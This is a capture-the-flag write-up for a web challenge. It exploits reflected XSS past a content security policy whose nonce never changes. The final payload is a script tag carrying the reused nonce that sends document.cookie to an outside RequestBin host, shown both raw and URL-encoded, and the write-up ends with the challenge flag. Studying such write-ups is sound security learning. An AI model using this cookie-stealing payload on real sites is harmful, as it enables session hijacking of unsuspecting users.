# Falling Slowly... Again

Category: Web

## Description

> This site boasts a defense against XSS, but its security is like a falling leaf – slow and predictable. It relies on a mechanism that, while sound in theory, has a fatal flaw in its execution. Can you exploit this weakness to inject your own malicious code and take control?

A website was attached.

## Solution

A simple file was attached. It contained two forms:

```html
<form action="/" method=GET>
    <label for="name">Your name:</label>
    <input placeholder="Crash Override" type="text" name="name">
    <input type="submit">
</form>


<form action="/bot" method=POST>
    <label for="name">Send link to the admin:</label>
    <input placeholder="https://example.org" type="text" name="url">
    <input type="submit">
</form>
```

Submitting a name returned a new HTML page with the name embedded into it:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Falling_Slowly_Again]
└─$ curl -s "https://once-web.2024-bq.ctfcompetition.com/?name=Test" | grep Hello -A 1 -B 1
    <div class="greeting">
        Hello Test
    </div>
```

What happens if we try to submit some XSS?

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Falling_Slowly_Again]
└─$ curl -s "https://once-web.2024-bq.ctfcompetition.com/" --get --data-urlencode "name=<script>alert(1)</script>" | grep Hello -A 1 -B 1
    <div class="greeting">
        Hello <script>alert(1)</script>
    </div>
```

Well, it's there indeed, but nothing happens because of the CSP:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Falling_Slowly_Again]
└─$ curl -s -I https://once-web.2024-bq.ctfcompetition.com/ | grep security
content-security-policy: default-src 'self'; script-src 'self' 'nonce-bO4ppxGUAjltHc4UXpjG6ggg'; style-src 'self' 'nonce-bO4ppxGUAjltHc4UXpjG6ggg'; connect-src *;
```

The CSP restricts the sources from which scripts can be loaded, allowing in this case scripts from the same origin ('self') and those that match the specified nonce.

The thing with a n**once**, though, is that you're supposed to use it, well, **once**:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Falling_Slowly_Again]
└─$ for i in {1..3}; do curl -s -I https://once-web.2024-bq.ctfcompetition.com/ | grep security; done
content-security-policy: default-src 'self'; script-src 'self' 'nonce-bO4ppxGUAjltHc4UXpjG6ggg'; style-src 'self' 'nonce-bO4ppxGUAjltHc4UXpjG6ggg'; connect-src *;
content-security-policy: default-src 'self'; script-src 'self' 'nonce-bO4ppxGUAjltHc4UXpjG6ggg'; style-src 'self' 'nonce-bO4ppxGUAjltHc4UXpjG6ggg'; connect-src *;
content-security-policy: default-src 'self'; script-src 'self' 'nonce-bO4ppxGUAjltHc4UXpjG6ggg'; style-src 'self' 'nonce-bO4ppxGUAjltHc4UXpjG6ggg'; connect-src *;
```

So if the nonce is predictable, it pretty much defeats the purpose. We'll send this as the name:

```html
<script nonce="bO4ppxGUAjltHc4UXpjG6ggg">fetch("https://enmcdb7vh9m1.x.pipedream.net?c=" + document.cookie);</script>
```

Share it with the admin via `https://once-web.2024-bq.ctfcompetition.com/?name=%3Cscript+nonce%3D%22bO4ppxGUAjltHc4UXpjG6ggg%22%3Efetch%28%22https%3A%2F%2Fenmcdb7vh9m1.x.pipedream.net%3Fc%3D%22+%2B+document.cookie%29%3B%3C%2Fscript%3E`, and collect the flag from our RequestBin: `CTF{NumberGeneratedOnce}`.

